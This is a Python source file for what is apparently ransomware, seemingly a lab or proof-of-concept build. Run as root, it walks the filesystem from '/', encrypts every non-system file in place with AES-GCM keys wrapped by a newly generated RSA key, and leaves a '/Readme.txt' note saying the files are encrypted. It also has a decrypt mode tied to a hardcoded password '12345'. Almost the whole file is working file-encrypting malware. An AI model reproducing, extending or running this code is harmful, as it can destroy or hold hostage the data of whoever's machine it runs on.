import os
import sys
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
import argparse
import struct
self = sys.argv[0]
passKey = "12345"
dirIgnoreList = ['/bin', '/boot', '/dev', '/etc', '/lib', '/proc', '/run', '/sbin', '/sys', '/usr/lib', '/usr/lib64', '/usr/libexec']
excludedFiles = [self, '/public_key.pem', '/private_key.pem', '/Readme.txt']
origin = "/"
MAGIC = b'RSA-AES-GCM\0'; VER = 1
def encrypt():
    print(f"[#] Starting file enumeration from {origin}")
    fileList = findFiles(origin)  # <-- keep your helper
    print(f"[#] File enumeration complete, found {len(fileList)} files")

    print("[#] Generating RSA keys")
    private_key = RSA.generate(2048)                # 4096 if you prefer
    public_key  = private_key.publickey()

    print("[#] key generation complete, writing files")
    # public key (PEM)
    with open("./public_key.pem", "wb") as pubFile:
        pubFile.write(public_key.export_key())

    # password-protected private key (PKCS#8, scrypt+AES-128-CBC)
    with open("./private_key.pem", "wb") as privFile:
        privFile.write(private_key.export_key(
            passphrase=passKey,
            pkcs=8,
            protection="scryptAndAES128-CBC",
        ))

    print("[#] Key files written, encrypting files")
    rsa_wrap = PKCS1_OAEP.new(public_key, hashAlgo=SHA256)

    for f in fileList:
        try:
            with open(f, "rb") as fh:
                plaintext = fh.read()

            # --- Hybrid encryption ---
            # 1) Make a random AES-256-GCM key + nonce
            aes_key = get_random_bytes(32)
            nonce   = get_random_bytes(12)  # 96-bit nonce
            aes     = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)

            # 2) Encrypt data
            ciphertext, tag = aes.encrypt_and_digest(plaintext)

            # 3) Wrap AES key with RSA-OAEP(SHA-256)
            wrapped = rsa_wrap.encrypt(aes_key)

            # 4) Write container back to the same file
            #    [MAGIC][VER u16][WRAPPED u32][NONCE u32][TAG u32][WRAPPED][NONCE][TAG][CIPHERTEXT]
            with open(f, "wb") as out:
                out.write(MAGIC)
                out.write(struct.pack(">HIII", VER, len(wrapped), len(nonce), len(tag)))
                out.write(wrapped)
                out.write(nonce)
                out.write(tag)
                out.write(ciphertext)

            print(f"[#] Encrypted: {f}")

        except Exception as e:
            print(f"[!] Failed to encrypt {f}: {e}")
    print("[#] Encryption complete. Writing Readme.txt")
    readme = open("/Readme.txt", "w")
    readme.write("Your files have been encrypted. To decrypt them, you will need the private key and the password.\n")
    readme.close()
    print("[#] Readme.txt written.")
def decrypt():
    print("[#] Reading private key file")
    try:
        with open('/private_key.pem', "rb") as key_file:
            private_key = RSA.import_key(key_file.read(), passphrase=passKey)
    except Exception as e:
        print("[X] Failed to read private key file:", e)
        return

    unwrap = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)

    print("[#] Private key file read, starting decryption")
    fileList = findFiles(origin)
    print(f"[#] File enumeration complete, found {len(fileList)} files")

    for f in fileList:
        try:
            with open(f, "rb") as fh:
                if fh.read(len(MAGIC)) != MAGIC:
                    raise ValueError("Not a valid RSA-AES-GCM container")
                ver, wlen, nlen, tlen = struct.unpack(">HIII", fh.read(14))
                if ver != VER:
                    raise ValueError(f"Unsupported version {ver}")
                wrapped = fh.read(wlen)
                nonce   = fh.read(nlen)
                tag     = fh.read(tlen)
                ct      = fh.read()

            # unwrap AES key with RSA-OAEP(SHA-256)
            aes_key = unwrap.decrypt(wrapped)

            # decrypt with AES-GCM
            aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
            plaintext = aes.decrypt_and_verify(ct, tag)

            with open(f, "wb") as out:
                out.write(plaintext)
            print(f"[#] Decrypted {f}")
        except Exception as e:
            print(f"[X] Failed to decrypt {f}: {e}")

    print("[#] Decryption complete.")
def findFiles(origin):
    ignore_dirs = set(_norm_path(p) for p in dirIgnoreList)
    exclude_files = set(_norm_path(p) for p in excludedFiles)

    start_real = _norm_path(origin)
    results = []
    for root, dirs, files in os.walk(start_real, topdown=True, followlinks=False):
        root_real = _norm_path(root)

        pruned = []
        for d in dirs:
            full = _norm_path(os.path.join(root_real, d))
            if full in ignore_dirs:
                continue
            pruned.append(d)
        dirs[:] = pruned

        for fname in files:
            fpath_real = _norm_path(os.path.join(root_real, fname))
            if fpath_real in exclude_files:
                continue
            results.append(fpath_real)

    return results
def _norm_path(p):
        try:
            return os.path.realpath(os.path.abspath(p))
        except Exception:
            return os.path.abspath(p)
def checkPass(userPass):
    if(userPass == passKey):
        return True
    else:
        return False
if(os.getuid() == 0):
    parser = argparse.ArgumentParser(description="Basic CLI for encrypt/decrypt")
    parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt files')
    parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt files')
    parser.add_argument('-o', '--origin', dest=origin, default=origin, type=str, required=False, help="Root path to start enumeration, defaults to '/'")
    parser.add_argument('-p', '--passkey', dest='password', default='', type=str, required=True, help='Password used for user authentication') # MODIFY
    args = parser.parse_args(sys.argv[1:])

    password = args.password

    if args.encrypt and args.decrypt:
        print("[X] Cannot specify both --encrypt and --decrypt")
    else:
        if not checkPass(password):
            print("[X] Invalid password.")
            sys.exit(1)
        if args.encrypt:
            encrypt()
        elif args.decrypt:
            decrypt()
